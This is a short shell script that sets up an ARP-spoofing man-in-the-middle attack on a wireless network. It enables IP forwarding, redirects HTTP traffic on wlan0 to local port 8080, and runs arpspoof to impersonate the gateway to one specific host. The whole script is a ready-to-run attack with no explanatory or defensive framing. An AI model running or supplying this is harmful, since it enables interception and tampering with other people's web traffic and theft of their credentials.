#/bin/sh
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp -i wlan0 --dport 80 -j REDIRECT --to-port 8080
arpspoof -i wlan0 -t 192.168.1.104 192.168.1.1
#
